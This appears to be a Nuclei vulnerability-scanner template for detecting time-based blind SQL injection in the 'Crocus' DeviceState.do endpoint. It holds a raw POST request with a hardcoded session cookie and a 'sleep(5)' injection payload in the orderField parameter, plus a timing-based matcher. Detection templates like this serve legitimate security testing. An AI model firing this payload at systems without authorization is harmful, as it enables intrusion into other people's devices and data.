id: Crocus-devicestate-sqli

info:
  name: Crocus-devicestate-sqli
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /DeviceState.do?Action=Query HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDI5Mjg4ODgyMC41MTQ3OSZSSUQ9MSZNPUJNYXAmSU5TPTE=
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36

        PageSize=1&PageIndex=0&orderField=(select*from(select%20sleep(5))a)

    matchers:
      - type: dsl
        condition: and
        dsl:
          - duration > 5 && contains_all(body,'Result','Items','200')